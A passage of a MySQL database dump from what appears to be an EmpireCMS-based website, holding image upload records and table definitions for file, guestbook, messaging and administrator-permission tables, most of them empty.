in',1588152651,18,'6196c67fc0c73b9c2b67eb5d62e2099.jpg',1,0,165,0,2,0),(343,1000010000000165,'b128daf755fad1d346a397dec3094bf7.jpg',57033,'','admin',1588152667,18,'8979c9d1c2b897561e6a278ef9a7b41.jpg',1,0,165,0,2,0),(344,1000010000000165,'ac286e51ba3e7288165929c7853425db.jpg',69453,'','admin',1588152680,18,'a890ec701b20b6f7bb211b1c5e2c9a2.jpg',1,0,165,0,2,0),(345,1000010000000165,'bd283d9e2f6caa1861d22a8b482e8f48.jpg',61986,'','admin',1588152694,18,'a1323144bafa8ff4b58d2555506d3c3.jpg',1,0,165,0,2,0),(346,1000010000000165,'4c2c04485ed4414df61da058344aeae5.jpg',52245,'','admin',1588152708,18,'aad714d4bfb7aaf03de7a14de4d665e.jpg',1,0,165,0,2,0),(347,1000010000000165,'7183089aeeca72573cba4b1fa29957e1.jpg',55780,'','admin',1588152718,18,'c49221ae59919f917eacf7b546f08c5.jpg',1,0,165,0,2,0),(348,1000010000000166,'2bd200f3af70d5faeac8db59bc12ca84.jpg',77584,'','admin',1588152798,18,'3beb1fb8278e229ee466759fc9b0d18.jpg',1,0,166,0,2,0),(349,1000010000000166,'6606d580e4fe16188f27246d703514e2.jpg',77584,'','admin',1588152813,18,'3beb1fb8278e229ee466759fc9b0d18.jpg',1,0,166,0,2,0),(350,1000010000000166,'2d3277cf1973010a17b8cce24615317c.jpg',47598,'','admin',1588152833,18,'8ffbef3b57948dce32377baa6532052.jpg',1,0,166,0,2,0),(351,1000010000000166,'7b594f2f8c456f8e12ff8c68ca8f3e85.jpg',73780,'','admin',1588152851,18,'9e980bb8a15e6bbafb3aa687ad43f69.jpg',1,0,166,0,2,0),(352,1000010000000166,'cba3ddbab353d6550b718e3106fa8464.jpg',65203,'','admin',1588152866,18,'85c503b32fdc5b4e86512f30c75a3b3.jpg',1,0,166,0,2,0),(353,1000010000000166,'85d9fec974c3fe18bcfa77a9d856765c.jpg',46109,'','admin',1588152911,18,'765fb28897461cc0245b9dfd2bb6a8b.jpg',1,0,166,0,2,0),(354,1000010000000166,'6e0d6718fa65fd58a6cdee04d4103fd9.jpg',72242,'','admin',1588152925,18,'c6ae61814a6310d75dfaa9ae46a05f4.jpg',1,0,166,0,2,0),(355,1000010000000166,'c82e9fbbb15b030c3d0f0300427d1431.jpg',36746,'','admin',1588152938,18,'e7d206f0c6c9b7bd4c2e898a45c8102.jpg',1,0,166,0,2,0),(365,1000010000000092,'1d38e55974805d6d5d837520f0508d9d.jpg',38039,'','admin',1588744828,14,'2.jpg',1,0,92,0,2,0),(366,1000010000000092,'410f9144ca245c44a28833bbcd30360b.jpg',26711,'','admin',1588744840,14,'3.jpg',1,0,92,0,2,0),(367,1000010000000092,'0a22176ec97ef5d946f5514c14bf652b.jpg',19621,'','admin',1588744856,14,'4.jpg',1,0,92,0,2,0),(368,1000010000000092,'ab26b72c597b7bbf67cad388717d2862.jpg',44639,'','admin',1588744871,14,'5.jpg',1,0,92,0,2,0),(369,1000010000000092,'2ab05b0a643240a8dafaec800adfad19.jpg',67910,'','admin',1588744907,14,'6.jpg',1,0,92,0,2,0),(370,1000010000000092,'6bf272139f9b54668142412a1b091ecc.jpg',60841,'','admin',1588744923,14,'7.jpg',1,0,92,0,2,0),(371,1000010000000092,'d54ec8635cc7f2b2bc94f7f9267fbedb.jpg',52223,'','admin',1588744934,14,'8.jpg',1,0,92,0,2,0),(372,1000010000000092,'ece8c644300f640df5c9b96cada29528.jpg',19480,'','admin',1588744946,14,'9.jpg',1,0,92,0,2,0),(378,1000010000000172,'71553116311ed81ce1d7a40f76cb6bd8.jpg',97921,'','admin',1589268830,22,'d67289c6f231b4916c9e9bfa66dceec.jpg',1,0,172,0,2,0),(379,1000010000000173,'c6f0bdd05658aef46b2787ad1af485fc.jpg',140976,'','admin',1589268869,22,'e92b04c78bac386b6e569ecae319d1c.jpg',1,0,173,0,2,0),(382,1000010000000176,'1f3e67d5fada2884c1cf91e71743801a.jpg',103516,'','admin',1589269395,26,'c664ba15879d87667329db4084cf601.jpg',1,0,176,0,2,0),(383,1000010000000177,'74520e9d913b8ddb4cb0d80a09c49cb7.jpg',116803,'','admin',1589269422,26,'f272158e68a3645c4e4df5df9996b1f.jpg',1,0,177,0,2,0),(384,1000010000000166,'e25d0ed1e8f9da9bfd440321a57930b4.jpg',101830,'','admin',1589269515,18,'1.jpg',1,0,166,0,2,0),(385,1000010000000166,'dadd5fd4d7c47686fbc174bf417071d3.jpg',59512,'','admin',1589269531,18,'2.jpg',1,0,166,0,2,0),(386,1000010000000166,'65a33c230956f090fb65a43a8cebbbfa.jpg',57199,'','admin',1589269547,18,'3.jpg',1,0,166,0,2,0),(387,1000010000000166,'a39e9a70f6e2dc4c82aa6356ad8592d1.jpg',49159,'','admin',1589269557,18,'4.jpg',1,0,166,0,2,0),(388,1000010000000166,'79ce1d86223f4fbb710e0958167ac0a6.jpg',59185,'','admin',1589269568,18,'5.jpg',1,0,166,0,2,0),(389,1000010000000166,'8db916d909d5cd85c8326bfcf64df3a7.jpg',95572,'','admin',1589269585,18,'6.jpg',1,0,166,0,2,0),(390,1000010000000166,'e6677caf1b713ae81cc993dfbc11e492.jpg',45717,'','admin',1589269596,18,'7.jpg',1,0,166,0,2,0),(391,1000010000000165,'95cea93d80ae36286bb114dc4b2614a7.jpg',72893,'','admin',1589269658,18,'1.jpg',1,0,165,0,2,0),(392,1000010000000165,'8909dfeb24f9b9f9ffc3dde8903039a6.jpg',70754,'','admin',1589269685,18,'2.jpg',1,0,165,0,2,0),(393,1000010000000165,'39165c53bdd0bc6072346a0e675682c3.jpg',66941,'','admin',1589269695,18,'3.jpg',1,0,165,0,2,0),(394,1000010000000165,'6d099834fbbddaa19ce7c9f975b7e2a3.jpg',57046,'','admin',1589269708,18,'4.jpg',1,0,165,0,2,0),(395,1000010000000165,'a4c4413b32b4b645f293da9228d4e57c.jpg',69467,'','admin',1589269719,18,'5.jpg',1,0,165,0,2,0),(396,1000010000000165,'d4ce3982b59aa5cd4e4ddcab7c17152a.jpg',61974,'','admin',1589269730,18,'6.jpg',1,0,165,0,2,0),(397,1000010000000165,'bfde42fbd58a6ac6f61ae5321b20b390.jpg',66524,'','admin',1589269742,18,'7.jpg',1,0,165,0,2,0),(398,1000010000000165,'1708ae491699b42fbc737767419bff38.jpg',71984,'','admin',1589269754,18,'8.jpg',1,0,165,0,2,0),(399,0,'869b91a0faea023143973146faea7ccc.jpg',978129,'','admin',1646364089,20,'微信图片_20220304110448.jpg',1,0,1646363135,1646363135,2,0),(400,0,'ee4dba1a7bc91da5e3933a4fa32fa01f.jpg',142494,'','admin',1646364230,20,'002.jpg',1,0,1646364124,1646364124,2,0),(401,1000010000000178,'4f263dd5d1acf9b0215baaaa53b0a6f0.jpg',142494,'','admin',1646374081,20,'002.jpg',1,0,178,0,2,0),(402,1000010000000178,'349b8a2b71361a2d42d42d3319aa8a3c.jpg',56053,'','admin',1646374788,20,'002.jpg',1,0,178,0,2,0),(403,1000010000000179,'aad6f18e8434bf5bf0f6abae61584da8.jpg',81645,'','admin',1646374810,20,'003.jpg',1,0,179,0,2,0),(404,1000010000000180,'bd5bd14b1b4616ed0f062a4e65911ba9.jpg',78905,'','admin',1646374827,20,'004.jpg',1,0,180,0,2,0),(405,1000010000000181,'b4600ddca80b10241f95055167d294b5.jpg',96355,'','admin',1646374877,20,'005.jpg',1,0,181,0,2,0),(406,1000010000000182,'5cffd9adbbd3aa6a9f25e1a84504d692.jpg',112764,'','admin',1646374893,20,'18.jpg',1,0,182,0,2,0),(407,1000010000000183,'c249a68274d9a93a2b249ef79829daa2.jpg',66562,'','admin',1646374909,20,'41.jpg',1,0,183,0,2,0);
/*!40000 ALTER TABLE `libang_enewsfile_1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsfile_member`
--

DROP TABLE IF EXISTS `libang_enewsfile_member`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsfile_member` (
  `fileid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `pubid` tinyint(1) NOT NULL DEFAULT '0',
  `filename` char(60) NOT NULL DEFAULT '',
  `filesize` int(10) unsigned NOT NULL DEFAULT '0',
  `path` char(20) NOT NULL DEFAULT '',
  `adduser` char(30) NOT NULL DEFAULT '',
  `filetime` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` tinyint(1) NOT NULL DEFAULT '0',
  `no` char(60) NOT NULL DEFAULT '',
  `type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `onclick` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `cjid` int(10) unsigned NOT NULL DEFAULT '0',
  `fpath` tinyint(1) NOT NULL DEFAULT '0',
  `modtype` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`fileid`),
  KEY `id` (`id`),
  KEY `type` (`type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsfile_member`
--

LOCK TABLES `libang_enewsfile_member` WRITE;
/*!40000 ALTER TABLE `libang_enewsfile_member` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsfile_member` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsfile_other`
--

DROP TABLE IF EXISTS `libang_enewsfile_other`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsfile_other` (
  `fileid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `pubid` tinyint(1) NOT NULL DEFAULT '0',
  `filename` char(60) NOT NULL DEFAULT '',
  `filesize` int(10) unsigned NOT NULL DEFAULT '0',
  `path` char(20) NOT NULL DEFAULT '',
  `adduser` char(30) NOT NULL DEFAULT '',
  `filetime` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` tinyint(1) NOT NULL DEFAULT '0',
  `no` char(60) NOT NULL DEFAULT '',
  `type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `onclick` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `cjid` int(10) unsigned NOT NULL DEFAULT '0',
  `fpath` tinyint(1) NOT NULL DEFAULT '0',
  `modtype` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`fileid`),
  KEY `id` (`id`),
  KEY `type` (`type`),
  KEY `modtype` (`modtype`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsfile_other`
--

LOCK TABLES `libang_enewsfile_other` WRITE;
/*!40000 ALTER TABLE `libang_enewsfile_other` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsfile_other` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsfile_public`
--

DROP TABLE IF EXISTS `libang_enewsfile_public`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsfile_public` (
  `fileid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `pubid` tinyint(1) NOT NULL DEFAULT '0',
  `filename` char(60) NOT NULL DEFAULT '',
  `filesize` int(10) unsigned NOT NULL DEFAULT '0',
  `path` char(20) NOT NULL DEFAULT '',
  `adduser` char(30) NOT NULL DEFAULT '',
  `filetime` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` tinyint(1) NOT NULL DEFAULT '0',
  `no` char(60) NOT NULL DEFAULT '',
  `type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `onclick` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `cjid` int(10) unsigned NOT NULL DEFAULT '0',
  `fpath` tinyint(1) NOT NULL DEFAULT '0',
  `modtype` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`fileid`),
  KEY `id` (`id`),
  KEY `type` (`type`),
  KEY `modtype` (`modtype`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsfile_public`
--

LOCK TABLES `libang_enewsfile_public` WRITE;
/*!40000 ALTER TABLE `libang_enewsfile_public` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsfile_public` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsgbook`
--

DROP TABLE IF EXISTS `libang_enewsgbook`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsgbook` (
  `lyid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `mycall` varchar(30) NOT NULL DEFAULT '',
  `lytime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `lytext` text NOT NULL,
  `retext` text NOT NULL,
  `bid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `eipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`lyid`),
  KEY `bid` (`bid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsgbook`
--

LOCK TABLES `libang_enewsgbook` WRITE;
/*!40000 ALTER TABLE `libang_enewsgbook` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsgbook` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsgbookclass`
--

DROP TABLE IF EXISTS `libang_enewsgbookclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsgbookclass` (
  `bid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `bname` varchar(60) NOT NULL DEFAULT '',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  PRIMARY KEY (`bid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsgbookclass`
--

LOCK TABLES `libang_enewsgbookclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsgbookclass` DISABLE KEYS */;
INSERT INTO `libang_enewsgbookclass` VALUES (1,'默认留言分类',0,0);
/*!40000 ALTER TABLE `libang_enewsgbookclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsgfenip`
--

DROP TABLE IF EXISTS `libang_enewsgfenip`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsgfenip` (
  `ip` varchar(20) NOT NULL DEFAULT '',
  `addtime` int(11) NOT NULL DEFAULT '0',
  UNIQUE KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsgfenip`
--

LOCK TABLES `libang_enewsgfenip` WRITE;
/*!40000 ALTER TABLE `libang_enewsgfenip` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsgfenip` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsgoodtype`
--

DROP TABLE IF EXISTS `libang_enewsgoodtype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsgoodtype` (
  `tid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tname` varchar(60) NOT NULL DEFAULT '',
  `ttype` tinyint(1) NOT NULL DEFAULT '0',
  `levelid` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `myorder` smallint(6) NOT NULL DEFAULT '0',
  `groupid` varchar(255) NOT NULL DEFAULT '',
  `showall` tinyint(1) NOT NULL DEFAULT '0',
  `showcid` text NOT NULL,
  `hiddencid` text NOT NULL,
  PRIMARY KEY (`tid`),
  KEY `ttype` (`ttype`),
  KEY `levelid` (`levelid`),
  KEY `myorder` (`myorder`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsgoodtype`
--

LOCK TABLES `libang_enewsgoodtype` WRITE;
/*!40000 ALTER TABLE `libang_enewsgoodtype` DISABLE KEYS */;
INSERT INTO `libang_enewsgoodtype` VALUES (1,'一级头条',1,1,0,'',0,'',''),(2,'二级头条',1,2,0,'',0,'',''),(3,'三级头条',1,3,0,'',0,'',''),(4,'四级头条',1,4,0,'',0,'',''),(5,'五级头条',1,5,0,'',0,'',''),(6,'六级头条',1,6,0,'',0,'',''),(7,'七级头条',1,7,0,'',0,'',''),(8,'八级头条',1,8,0,'',0,'',''),(9,'九级头条',1,9,0,'',0,'',''),(10,'一级推荐',0,1,0,'',0,'',''),(11,'二级推荐',0,2,0,'',0,'',''),(12,'三级推荐',0,3,0,'',0,'',''),(13,'四级推荐',0,4,0,'',0,'',''),(14,'五级推荐',0,5,0,'',0,'',''),(15,'六级推荐',0,6,0,'',0,'',''),(16,'七级推荐',0,7,0,'',0,'',''),(17,'八级推荐',0,8,0,'',0,'',''),(18,'九级推荐',0,9,0,'',0,'','');
/*!40000 ALTER TABLE `libang_enewsgoodtype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsgroup`
--

DROP TABLE IF EXISTS `libang_enewsgroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsgroup` (
  `groupid` smallint(6) NOT NULL AUTO_INCREMENT,
  `groupname` varchar(50) NOT NULL DEFAULT '',
  `dopublic` tinyint(1) NOT NULL DEFAULT '0',
  `doclass` tinyint(1) NOT NULL DEFAULT '0',
  `dotemplate` tinyint(1) NOT NULL DEFAULT '0',
  `dopicnews` tinyint(1) NOT NULL DEFAULT '0',
  `dofile` tinyint(1) NOT NULL DEFAULT '0',
  `douser` tinyint(1) NOT NULL DEFAULT '0',
  `dolog` tinyint(1) NOT NULL DEFAULT '0',
  `domember` tinyint(1) NOT NULL DEFAULT '0',
  `dobefrom` tinyint(1) NOT NULL DEFAULT '0',
  `doword` tinyint(1) NOT NULL DEFAULT '0',
  `dokey` tinyint(1) NOT NULL DEFAULT '0',
  `doad` tinyint(1) NOT NULL DEFAULT '0',
  `dovote` tinyint(1) NOT NULL DEFAULT '0',
  `dogroup` tinyint(1) NOT NULL DEFAULT '0',
  `doall` tinyint(1) NOT NULL DEFAULT '0',
  `docj` tinyint(1) NOT NULL DEFAULT '0',
  `dobq` tinyint(1) NOT NULL DEFAULT '0',
  `domovenews` tinyint(1) NOT NULL DEFAULT '0',
  `dopostdata` tinyint(1) NOT NULL DEFAULT '0',
  `dochangedata` tinyint(1) NOT NULL DEFAULT '0',
  `dopl` tinyint(1) NOT NULL DEFAULT '0',
  `dof` tinyint(1) NOT NULL DEFAULT '0',
  `dom` tinyint(1) NOT NULL DEFAULT '0',
  `dodo` tinyint(1) NOT NULL DEFAULT '0',
  `dodbdata` tinyint(1) NOT NULL DEFAULT '0',
  `dorepnewstext` tinyint(1) NOT NULL DEFAULT '0',
  `dotempvar` tinyint(1) NOT NULL DEFAULT '0',
  `dostats` tinyint(1) NOT NULL DEFAULT '0',
  `dowriter` tinyint(1) NOT NULL DEFAULT '0',
  `dototaldata` tinyint(1) NOT NULL DEFAULT '0',
  `dosearchkey` tinyint(1) NOT NULL DEFAULT '0',
  `dozt` tinyint(1) NOT NULL DEFAULT '0',
  `docard` tinyint(1) NOT NULL DEFAULT '0',
  `dolink` tinyint(1) NOT NULL DEFAULT '0',
  `doselfinfo` tinyint(1) NOT NULL DEFAULT '0',
  `doexecsql` tinyint(1) NOT NULL DEFAULT '0',
  `dotable` tinyint(1) NOT NULL DEFAULT '0',
  `dodownurl` tinyint(1) NOT NULL DEFAULT '0',
  `dodeldownrecord` tinyint(1) NOT NULL DEFAULT '0',
  `doshoppayfs` tinyint(1) NOT NULL DEFAULT '0',
  `doshopps` tinyint(1) NOT NULL DEFAULT '0',
  `doshopdd` tinyint(1) NOT NULL DEFAULT '0',
  `dogbook` tinyint(1) NOT NULL DEFAULT '0',
  `dofeedback` tinyint(1) NOT NULL DEFAULT '0',
  `douserpage` tinyint(1) NOT NULL DEFAULT '0',
  `donotcj` tinyint(1) NOT NULL DEFAULT '0',
  `dodownerror` tinyint(1) NOT NULL DEFAULT '0',
  `dodelinfodata` tinyint(1) NOT NULL DEFAULT '0',
  `doaddinfo` tinyint(1) NOT NULL DEFAULT '0',
  `doeditinfo` tinyint(1) NOT NULL DEFAULT '0',
  `dodelinfo` tinyint(1) NOT NULL DEFAULT '0',
  `doadminstyle` tinyint(1) NOT NULL DEFAULT '0',
  `dorepdownpath` tinyint(1) NOT NULL DEFAULT '0',
  `douserjs` tinyint(1) NOT NULL DEFAULT '0',
  `douserlist` tinyint(1) NOT NULL DEFAULT '0',
  `domsg` tinyint(1) NOT NULL DEFAULT '0',
  `dosendemail` tinyint(1) NOT NULL DEFAULT '0',
  `dosetmclass` tinyint(1) NOT NULL DEFAULT '0',
  `doinfodoc` tinyint(1) NOT NULL DEFAULT '0',
  `dotempgroup` tinyint(1) NOT NULL DEFAULT '0',
  `dofeedbackf` tinyint(1) NOT NULL DEFAULT '0',
  `dotask` tinyint(1) NOT NULL DEFAULT '0',
  `domemberf` tinyint(1) NOT NULL DEFAULT '0',
  `dospacestyle` tinyint(1) NOT NULL DEFAULT '0',
  `dospacedata` tinyint(1) NOT NULL DEFAULT '0',
  `dovotemod` tinyint(1) NOT NULL DEFAULT '0',
  `doplayer` tinyint(1) NOT NULL DEFAULT '0',
  `dowap` tinyint(1) NOT NULL DEFAULT '0',
  `dopay` tinyint(1) NOT NULL DEFAULT '0',
  `dobuygroup` tinyint(1) NOT NULL DEFAULT '0',
  `dosearchall` tinyint(1) NOT NULL DEFAULT '0',
  `doinfotype` tinyint(1) NOT NULL DEFAULT '0',
  `doplf` tinyint(1) NOT NULL DEFAULT '0',
  `dopltable` tinyint(1) NOT NULL DEFAULT '0',
  `dochadminstyle` tinyint(1) NOT NULL DEFAULT '0',
  `dotags` tinyint(1) NOT NULL DEFAULT '0',
  `dosp` tinyint(1) NOT NULL DEFAULT '0',
  `doyh` tinyint(1) NOT NULL DEFAULT '0',
  `dofirewall` tinyint(1) NOT NULL DEFAULT '0',
  `dosetsafe` tinyint(1) NOT NULL DEFAULT '0',
  `douserclass` tinyint(1) NOT NULL DEFAULT '0',
  `doworkflow` tinyint(1) NOT NULL DEFAULT '0',
  `domenu` tinyint(1) NOT NULL DEFAULT '0',
  `dopubvar` tinyint(1) NOT NULL DEFAULT '0',
  `doclassf` tinyint(1) NOT NULL DEFAULT '0',
  `doztf` tinyint(1) NOT NULL DEFAULT '0',
  `dofiletable` tinyint(1) NOT NULL DEFAULT '0',
  `docheckinfo` tinyint(1) NOT NULL DEFAULT '0',
  `dogoodinfo` tinyint(1) NOT NULL DEFAULT '0',
  `dodocinfo` tinyint(1) NOT NULL DEFAULT '0',
  `domoveinfo` tinyint(1) NOT NULL DEFAULT '0',
  `dodttemp` tinyint(1) NOT NULL DEFAULT '0',
  `doloadcj` tinyint(1) NOT NULL DEFAULT '0',
  `domustcheck` tinyint(1) NOT NULL DEFAULT '0',
  `docheckedit` tinyint(1) NOT NULL DEFAULT '0',
  `domemberconnect` tinyint(1) NOT NULL DEFAULT '0',
  `doprecode` tinyint(1) NOT NULL DEFAULT '0',
  `domoreport` tinyint(1) NOT NULL DEFAULT '0',
  `docanhtml` tinyint(1) NOT NULL DEFAULT '0',
  `dodelclass` tinyint(1) NOT NULL DEFAULT '0',
  `doinfofile` tinyint(1) NOT NULL DEFAULT '0',
  `doingroup` tinyint(1) NOT NULL DEFAULT '0',
  `domembergroup` tinyint(1) NOT NULL DEFAULT '0',
  `doviewgroup` tinyint(1) NOT NULL DEFAULT '0',
  `domadmingroup` tinyint(1) NOT NULL DEFAULT '0',
  `dochmoreport` tinyint(1) NOT NULL DEFAULT '0',
  `doisqf` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`groupid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsgroup`
--

LOCK TABLES `libang_enewsgroup` WRITE;
/*!40000 ALTER TABLE `libang_enewsgroup` DISABLE KEYS */;
INSERT INTO `libang_enewsgroup` VALUES (1,'超级管理员',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,1,1,1,1,1,1,1,1,0);
/*!40000 ALTER TABLE `libang_enewsgroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewshmsg`
--

DROP TABLE IF EXISTS `libang_enewshmsg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewshmsg` (
  `mid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(80) NOT NULL DEFAULT '',
  `msgtext` text NOT NULL,
  `haveread` tinyint(1) NOT NULL DEFAULT '0',
  `msgtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `to_username` varchar(30) NOT NULL DEFAULT '',
  `from_userid` int(10) unsigned NOT NULL DEFAULT '0',
  `from_username` varchar(30) NOT NULL DEFAULT '',
  `isadmin` tinyint(1) NOT NULL DEFAULT '0',
  `issys` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`),
  KEY `to_username` (`to_username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewshmsg`
--

LOCK TABLES `libang_enewshmsg` WRITE;
/*!40000 ALTER TABLE `libang_enewshmsg` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewshmsg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewshnotice`
--

DROP TABLE IF EXISTS `libang_enewshnotice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewshnotice` (
  `mid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(80) NOT NULL DEFAULT '',
  `msgtext` text NOT NULL,
  `haveread` tinyint(1) NOT NULL DEFAULT '0',
  `msgtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `to_username` varchar(30) NOT NULL DEFAULT '',
  `from_userid` int(10) unsigned NOT NULL DEFAULT '0',
  `from_username` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`mid`),
  KEY `to_username` (`to_username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewshnotice`
--

LOCK TABLES `libang_enewshnotice` WRITE;
/*!40000 ALTER TABLE `libang_enewshnotice` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewshnotice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewshy`
--

DROP TABLE IF EXISTS `libang_enewshy`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewshy` (
  `fid` bigint(20) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL DEFAULT '0',
  `fname` varchar(30) NOT NULL DEFAULT '',
  `cid` int(11) NOT NULL DEFAULT '0',
  `fsay` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`fid`),
  KEY `userid` (`userid`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewshy`
--

LOCK TABLES `libang_enewshy` WRITE;
/*!40000 ALTER TABLE `libang_enewshy` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewshy` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewshyclass`
--

DROP TABLE IF EXISTS `libang_enewshyclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewshyclass` (
  `cid` int(11) NOT NULL AUTO_INCREMENT,
  `cname` varchar(30) NOT NULL DEFAULT '',
  `userid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`cid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewshyclass`
--

LOCK TABLES `libang_enewshyclass` WRITE;
/*!40000 ALTER TABLE `libang_enewshyclass` DISABLE KEYS */;
